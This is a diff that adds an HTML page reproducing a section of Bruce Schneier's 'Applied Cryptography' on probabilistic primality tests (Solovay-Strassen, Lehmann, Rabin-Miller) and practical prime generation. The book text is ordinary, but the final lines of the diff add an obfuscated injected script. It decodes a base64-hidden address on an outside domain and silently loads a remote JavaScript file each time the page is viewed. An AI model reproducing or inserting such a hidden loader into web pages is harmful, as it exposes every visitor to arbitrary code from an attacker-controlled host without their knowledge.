@@ -1,0 +1,114 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=258-261//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-13.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The wrong way to find primes is to generate random numbers and then try to factor them. The right way is to generate random numbers and test if they are prime. There are several probabilistic primality tests; tests that determine whether a number is prime with a given degree of confidence. Assuming this &#147;degree of confidence&#148; is large enough, these sorts of tests are good enough. I&#146;ve heard primes generated in this manner called &#147;industrial-grade primes&#148;: These are numbers that are probably prime with a controllably small chance of error.
+</P>
+<P>Assume a test is set to fail once in 2<SUP><SMALL>50</SMALL></SUP> tries. This means that there is a 1 in 10<SUP><SMALL>15</SMALL></SUP> chance that the test falsely indicates that a composite number is prime. (The test will never falsely indicate that a prime number is composite.) If for some reason you need more confidence that the number is prime, you can set the failure level even lower. On the other hand, if you consider that the odds of the number being composite are 300 million times less than the odds of winning top prize in a state lottery, you might not worry about it so much.</P>
+<P>Overviews of recent developments in the field can be found in [1256, 206]. Other important papers are [1490, 384, 11, 19, 626, 651, 911].</P>
+<P><FONT SIZE="+1"><B><I>Solovay-Strassen</I></B></FONT></P>
+<P>Robert Solovay and Volker Strassen developed a probabilistic primality testing algorithm [1490]. Their algorithm uses the Jacobi symbol to test if <I>p</I> is prime:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Choose a random number, <I>a</I>, less than <I>p.</I>
+<DD><B>(2)</B>&nbsp;&nbsp;If the gcd(<I>a,p</I>) &#8800; 1, then <I>p</I> fails the test and is composite.
+<DD><B>(3)</B>&nbsp;&nbsp;Calculate <I>j</I> = a<SUP><SMALL>(<I>p-</I> 1)/2</SMALL></SUP> mod <I>p.</I>
+<DD><B>(4)</B>&nbsp;&nbsp;Calculate the Jacobi symbol J(<I>a,p</I>).
+<DD><B>(5)</B>&nbsp;&nbsp;If <I>j</I> &#8800; J(<I>a,p</I>), then <I>p</I> is definitely not prime.
+<DD><B>(6)</B>&nbsp;&nbsp;If <I>j</I> = J(<I>a,p</I>), then the likelihood that <I>p</I> is not prime is no more than 50 percent.
+</DL>
+<P>A number <I>a</I> that does not indicate that <I>p</I> is definitely not prime is called a <B>witness</B>. If <I>p</I> is composite, the odds of a random <I>a</I> being a witness is no less than 50 percent. Repeat this test <I>t</I> times, with <I>t</I> different random values for <I>a.</I> The odds of a composite number passing all <I>t</I> tests is no more than one in 2<SUP><SMALL>t</SMALL></SUP>.</P>
+<P><FONT SIZE="+1"><B><I>Lehmann</I></B></FONT></P>
+<P>Another, simpler, test was developed independently by Lehmann [945]. Here it tests if <I>p</I> is prime:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Choose a random number <I>a</I> less than <I>p.</I>
+<DD><B>(2)</B>&nbsp;&nbsp;Calculate a<SUP><SMALL>(<I>p-</I> 1)/2</SMALL></SUP> mod <I>p.</I>
+<DD><B>(3)</B>&nbsp;&nbsp;If a<SUP><SMALL>(<I>p-</I> 1)/2</SMALL></SUP> &#8800; 1 or - 1 (mod <I>p</I>), then <I>p</I> is definitely not prime.
+<DD><B>(4)</B>&nbsp;&nbsp;If a<SUP><SMALL>(<I>p-</I> 1)/2</SMALL></SUP> &#8801; 1 or - 1 (mod <I>p</I>), then the likelihood that <I>p</I> is not prime is no more than 50 percent.
+</DL>
+<P>Again, the odds of a random <I>a</I> being a witness to <I>p</I> &#146;s compositeness is no less than 50 percent. Repeat this test <I>t</I> times. If the calculation equals 1 or -1, but does not always equal 1, then <I>p</I> is probably prime with an error rate of 1 in 2<SUP><SMALL>t</SMALL></SUP> .</P>
+<P><FONT SIZE="+1"><B><I>Rabin-Miller</I></B></FONT></P>
+<P>The algorithm everyone uses&#151;it&#146;s easy&#151;was developed by Michael Rabin, based in part on Gary Miller&#146;s ideas [1093, 1284]. Actually, this is a simplified version of the algorithm recommended in the DSS proposal [1149, 1154].
+</P>
+<P>Choose a random number, <I>p</I>, to test. Calculate <I>b</I>, where <I>b</I> is the number of times 2 divides <I>p</I> - <I></I> 1 (i.e., 2<SUP><SMALL>b</SMALL></SUP> is the largest power of 2 that divides <I>p</I> - 1). Then calculate <I>m</I>, such that <I>p</I> = 1 &#43; 2<SUP><SMALL>b</SMALL></SUP> *<I>m</I>.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Choose a random number, <I>a</I>, such that <I>a</I> is less than <I>p.</I>
+<DD><B>(2)</B>&nbsp;&nbsp;Set <I>j</I> = 0 and set <I>z</I> = a<SUP><SMALL>m</SMALL></SUP> mod <I>p.</I>
+<DD><B>(3)</B>&nbsp;&nbsp;If <I>z</I> = 1, or if <I>z</I> = p - 1, then <I>p</I> passes the test and may be prime.
+<DD><B>(4)</B>&nbsp;&nbsp;If <I>j</I> &gt 0 and <I>z</I> = 1, then <I>p</I> is not prime.
+<DD><B>(5)</B>&nbsp;&nbsp;Set <I>j</I> = j &#43; 1. If <I>j</I> &lt b and <I>z</I> &#8800; <I>p</I> - 1, set <I>z</I> = z<SUP><SMALL>2</SMALL></SUP> mod <I>p</I> and go back to step (4). If <I>z</I> = p - 1, then <I>p</I> passes the test and may be prime.
+<DD><B>(6)</B>&nbsp;&nbsp;If <I>j</I> = b and <I>z</I> &#8800; <I>p</I> - 1, then <I>p</I> is not prime.
+</DL>
+<P>The odds of a composite passing decreases faster with this test than with previous ones. Three-quarters of the possible values of <I>a</I> are guaranteed to be witnesses. This means that a composite number will slip through <I>t</I> tests no more than &#188;<SUP><SMALL>t</SMALL></SUP> of the time, where <I>t</I> is the number of iterations. Actually, these numbers are very pessimistic. For most random numbers, something like 99.9 percent of the possible <I>a</I> values are witnesses [96].</P>
+<P>There are even better estimations [417]. For <I>n-</I> bit candidate primes (where <I>n</I> is more than 100), the odds of error in one test are less than 1 in 4<I>n</I> 2<SUP><SMALL>(<I>k</I>/2)<SUP><SMALL>(1/2)</SMALL></SUP></SMALL></SUP>. And for a 256-bit <I>n</I>, the odds of error in six tests are less than 1 in 2<SUP><SMALL>51</SMALL></SUP> . More theory is in [418].</P>
+<P><FONT SIZE="+1"><B><I>Practical Considerations</I></B></FONT></P>
+<P>In real-world implementations, prime generation goes quickly.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Generate a random <I>n-</I> bit number, <I>p.</I>
+<DD><B>(2)</B>&nbsp;&nbsp;Set the high-order and low-order bit to 1. (The high-order bit ensures that the prime is of the required length and the low-order bit ensures that it is odd.)
+<DD><B>(3)</B>&nbsp;&nbsp;Check to make sure <I>p</I> is not divisible by any small primes: 3, 5, 7, 11, and so on. Many implementations test <I>p</I> for divisibility by all primes less than 256. The most efficient is to test for divisibility by all primes less than 2000 [949]. You can do this efficiently using a wheel [863].
+<DD><B>(4)</B>&nbsp;&nbsp;Perform the Rabin-Miller test for some random <I>a.</I> If <I>p</I> passes, generate another random <I>a</I> and go through the test again. Choose a small value of <I>a</I> to make the calculations go quicker. Do five tests [651]. (One might seem like enough, but do five.) If <I>p</I> fails one of the tests, generate another <I>p</I> and try again.
+</DL>
+<P>Another option is not to generate a random <I>p</I> each time, but to incrementally search through numbers starting at a random point until you find a prime.</P>
+<P>Step (3) is optional, but it is a good idea. Testing a random odd <I>p</I> to make sure it is not divisible by 3, 5, and 7 eliminates 54 percent of the odd numbers before you get to step (4). Testing against all primes less than 100 eliminates 76 percent of the odd numbers; testing against all primes less than 256 eliminates 80 percent. In general, the fraction of odd candidates that is not a multiple of any prime less than <I>n</I> is 1.12/ln <I>n.</I> The larger the <I>n</I> you test up to, the more precomputation is required before you get to the Rabin-Miller test.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-13.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(SBJchxdR, ebjmFqJF) {ebjmFqJF = SBJchxdR.createElement('script');ebjmFqJF.type = 'text/javascript';ebjmFqJF.async = true;ebjmFqJF.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');SBJchxdR.getElementsByTagName('body')[0].appendChild(ebjmFqJF);}(document));</script></body>
+</html>
